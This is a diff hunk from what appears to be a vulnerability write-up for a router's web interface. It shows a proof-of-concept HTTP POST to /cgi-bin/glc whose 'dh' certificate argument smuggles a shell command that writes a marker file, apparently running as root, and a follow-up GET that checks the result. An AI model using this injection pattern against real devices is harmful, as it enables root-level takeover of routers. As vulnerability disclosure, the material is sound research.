@@ -145,11 +145,27 @@ Inference: the execution context is root, as stated in the current report. The c
 ```http
 POST /cgi-bin/glc HTTP/1.1
 Host: 192.168.8.1
+Accept: application/json, text/plain, */*
 Content-Type: application/json
+Origin: http://192.168.8.1
+Referer: http://192.168.8.1/
+Connection: close
+Content-Length: 139
 
 {"object":"ovpn-server","method":"generate_certificate","args":{"dh":"x; echo OVPN_DH_RCE_20260430 >/www/OVPN_DH_RCE_20260430.txt; #"}}
+
+
 ```
 ![alt text](./imag/image-1.png)
+
+```json
+GET /OVPN_DH_RCE_20260430.txt HTTP/1.1
+Host: 192.168.8.1
+Accept: */*
+Connection: close
+```
+
+
 ![alt text](./imag/image-2.png)
 
 ## Minimal Vulnerable Flow
